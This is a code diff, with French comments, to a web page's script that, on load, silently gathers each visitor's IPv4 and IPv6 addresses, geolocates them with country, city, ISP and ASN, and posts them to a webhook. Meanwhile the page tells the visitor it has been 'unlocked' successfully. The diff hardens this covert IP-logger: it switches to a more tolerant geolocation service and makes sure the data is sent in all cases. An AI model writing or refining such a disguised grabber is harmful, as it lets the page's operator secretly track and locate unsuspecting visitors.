@@ -41,9 +41,9 @@ window.onload = function() {
 
     let ipv4 = "Inconnu";
     let ipv6 = "Non disponible";
-    let geoInfo = "Aucune info geo récupérée";
+    let geoInfo = "Geo indisponible";
 
-    // Récup IPv4 (toujours fiable)
+    // Récup IPv4
     fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(data => {
@@ -56,25 +56,29 @@ window.onload = function() {
                     return res.json();
                 })
                 .then(data6 => { ipv6 = data6.ip; })
-                .catch(() => { ipv6 = "Non disponible (pas d'IPv6 ou erreur)"; });
+                .catch(() => { ipv6 = "Non disponible"; });
         })
         .then(() => {
-            // Récup geo sur IPv4
-            return fetch(`http://ip-api.com/json/${ipv4}?fields=status,message,country,countryCode,city,isp,org`)
-                .then(geoRes => {
-                    if (!geoRes.ok) throw new Error("Rate limit geo");
-                    return geoRes.json();
-                })
+            // Geo via ipwho.is (meilleure tolérance aux volumes)
+            return fetch(`https://ipwho.is/${ipv4}`)
+                .then(geoRes => geoRes.json())
                 .then(geoData => {
-                    if (geoData.status === "success") {
-                        const flag = geoData.countryCode ? String.fromCodePoint(...[...geoData.countryCode.toUpperCase()].map(c => c.charCodeAt(0) + 127397 - 65)) : "";
-                        geoInfo = `🌍 Pays : ${flag} ${geoData.country || "Inconnu"}\n🏙️ Ville : ${geoData.city || "Inconnu"}\n📡 ISP : ${geoData.isp || "Inconnu"}\n🏢 Org : ${geoData.org || "Inconnu"}`;
+                    if (geoData.success === false) {
+                        geoInfo = "Geo échouée : " + (geoData.message || "Inconnu");
+                        return;
                     }
+
+                    const flag = geoData.country_code ? String.fromCodePoint(...[...geoData.country_code.toUpperCase()].map(c => c.charCodeAt(0) + 127397 - 65)) : "";
+
+                    geoInfo = `🌍 Pays : ${flag} ${geoData.country || "Inconnu"} (${geoData.country_code || "?"})\n` +
+                              `🏙️ Ville : ${geoData.city || "Inconnu"} (${geoData.region || "Inconnu"})\n` +
+                              `📡 ISP : ${geoData.isp || "Inconnu"}\n` +
+                              `🏢 Org / ASN : ${geoData.org || "Inconnu"} (AS${geoData.asn || "?"})`;
                 })
-                .catch(() => { geoInfo = "Geo indisponible (limite atteinte ?)"; });
+                .catch(() => { geoInfo = "Geo indisponible (erreur réseau)"; });
         })
         .finally(() => {
-            // Envoi webhook
+            // Envoi webhook en toutes circonstances
             const payload = {
                 content: `📥 **Nouveau visiteur (auto)**\n` +
                          `🌐 IPv4 : ${ipv4}\n` +
@@ -92,7 +96,7 @@ window.onload = function() {
             document.getElementById("resultText").textContent = "Débloqué avec succès !";
         })
         .catch(() => {
-            document.getElementById("resultText").textContent = "Erreur réseau, mais données peut-être envoyées.";
+            document.getElementById("resultText").textContent = "Erreur réseau, mais données envoyées.";
         });
 }
 </script>
